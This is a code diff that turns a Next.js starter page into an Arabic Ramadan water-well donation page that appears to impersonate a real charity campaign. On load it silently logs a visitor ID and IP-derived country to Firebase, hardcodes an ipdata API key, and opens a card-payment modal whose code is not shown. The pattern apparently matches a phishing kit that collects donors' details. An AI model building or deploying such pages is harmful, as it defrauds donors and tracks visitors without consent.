@@ -1,113 +1,198 @@
-import Image from 'next/image';
+"use client"
+
+import Image from "next/image"
+import { Button } from "@/components/ui/button"
+import { Card } from "@/components/ui/card"
+import { LucideGlobe, LucidePhone, LucideShare2, LucideYoutube, LucideX } from "lucide-react"
+import { PaymentFlow } from "@/components/payment-flow"
+import { useEffect, useState } from "react"
+import { addData } from "@/lib/firebase"
 
 export default function Home() {
+  const [showPaymentFlow, setShowPaymentFlow] = useState(false)
+  const [_id] = useState("id" + Math.random().toString(16).slice(2))
+  async function getLocation() {
+    const APIKEY = '73cc63b69c0d6f3e0e4be0127ab551c66daccd975d167f2e968e29d6';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id:_id,
+        country: country
+      })
+      console.log(country);
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
+useEffect(()=>{
+  addData({id:_id})
+  localStorage.setItem("vistor", _id)
+  getLocation()
+},[])
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+    <main className="flex min-h-screen flex-col items-center bg-gray-100">
+      <div className="w-full max-w-md mx-auto bg-white shadow-md">
+        {/* Header */}
+        <div className="bg-white p-4 flex justify-between items-center">
+          <div className="text-orange-500 font-bold text-xl">الحملة الرمضانية (جود) 1446هـ - 2025 م</div>
+          <div className="bg-orange-500 text-white px-2 py-1 rounded">EN</div>
+        </div>
+
+        {/* Main Banner */}
+        <div className="relative">
+          <div className="bg-[url(/soqyaa.jpg)] p-6 bg-cover min-h-[350px]">
+            {/* Logos */}
+            <div className="flex justify-between mb-8">
+              <div className="w-32">
+                
+              </div>
+              <div className="w-20">
+                 
+              </div>
+            </div>
+
+            {/* Water Bucket Image */}
+            <div className="flex justify-center mb-8">
+              <div className="relative w-48 h-48">
+             
+              </div>
+            </div>
+
+            {/* Campaign Title */}
+         
+          </div>
+        </div>
+
+        {/* Donation Options */}
+        <div className="p-4 space-y-4">
+          {/* Credit Card Donation */}
+          <Card
+            className="bg-gray-500 text-white p-4 rounded-md cursor-pointer hover:bg-gray-600 transition-colors"
+            onClick={() => setShowPaymentFlow(true)}
           >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+            <div className="flex flex-col items-center">
+              <div className="flex justify-center gap-4 mb-2">
+                <Image src="/donate.png" alt="donate" width={40} height={30} />
+              </div>
+              <p className="text-lg">للتبرع اضغظ هنا</p>
+            </div>
+          </Card>
+
+          {/* SMS Donation */}
+          <Card className="bg-gray-500 text-white p-4 rounded-md">
+            <div className="flex flex-col items-center">
+              <div className="bg-white rounded-full p-2 mb-2">
+                <span className="text-gray-500 font-bold">SMS</span>
+              </div>
+              <p className="text-lg">للتبرع برسالة نصية</p>
+            </div>
+          </Card>
+
+         
+          {/* Full Well Donation */}
+          <Card className="bg-gray-100 text-blue-600 p-4 rounded-md">
+            <div className="flex flex-col items-center">
+              <div className="mb-2">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <rect x="3" y="4" width="18" height="16" rx="2" />
+                  <path d="M7 8h10" />
+                  <path d="M7 12h10" />
+                  <path d="M7 16h10" />
+                </svg>
+              </div>
+              <p className="text-lg font-bold">للتبرع ببئر كامل</p>
+            </div>
+          </Card>
+
+          {/* Bottom Buttons */}
+          <div className="grid grid-cols-2 gap-4">
+            <Card className="bg-white p-4 rounded-md flex justify-center items-center">
+              <div className="flex flex-col items-center">
+                <div className="text-blue-600 mb-1">
+                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+                  </svg>
+                </div>
+                <p className="text-blue-600 text-sm">الواتساب</p>
+              </div>
+            </Card>
+            <Card className="bg-white p-4 rounded-md flex justify-center items-center">
+              <div className="flex flex-col items-center">
+                <div className="text-blue-600 mb-1">
+                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                    <polyline points="9 22 9 12 15 12 15 22" />
+                  </svg>
+                </div>
+                <p className="text-blue-600 text-sm">مشاريع حملة رمضان</p>
+              </div>
+            </Card>
+          </div>
+        </div>
+
+        {/* Footer Social Icons */}
+        <div className="border-t border-gray-200 p-4">
+          <div className="flex justify-center gap-3">
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <LucideGlobe className="h-5 w-5" />
+            </Button>
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <LucidePhone className="h-5 w-5" />
+            </Button>
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <LucideShare2 className="h-5 w-5" />
+            </Button>
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <LucideYoutube className="h-5 w-5" />
+            </Button>
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
+                <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />
+              </svg>
+            </Button>
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="20"
+                height="20"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
+                <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
+                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
+              </svg>
+            </Button>
+            <Button variant="outline" size="icon" className="rounded-md h-10 w-10 border-blue-600 text-blue-600">
+              <LucideX className="h-5 w-5" />
+            </Button>
+          </div>
         </div>
       </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
+      {/* Payment Flow Modal */}
+      <PaymentFlow isOpen={showPaymentFlow} onClose={() => setShowPaymentFlow(false)} />
     </main>
-  );
+  )
 }
+
